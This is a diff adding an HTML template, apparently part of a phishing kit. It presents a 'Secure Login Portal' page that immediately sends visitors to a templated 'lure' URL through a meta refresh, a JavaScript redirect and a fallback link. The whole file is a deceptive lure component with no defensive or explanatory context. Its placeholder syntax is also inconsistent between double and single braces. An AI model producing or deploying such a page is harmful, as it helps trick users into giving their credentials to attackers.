@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url={{lure_url_html}}">
+    <title>Secure Login Redirect</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f5f5f5;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Secure Login Portal</h1>
+    <p>You are being redirected to the secure login page...</p>
+    <div class="loader"></div>
+    <p>If you are not redirected automatically, <a href="{lure_url_html}">click here</a>.</p>
+    
+    <script>
+        // JavaScript redirect as backup (fires immediately)
+        window.location.replace({lure_url_js});
+        
+    </script>
+</body>
+</html>
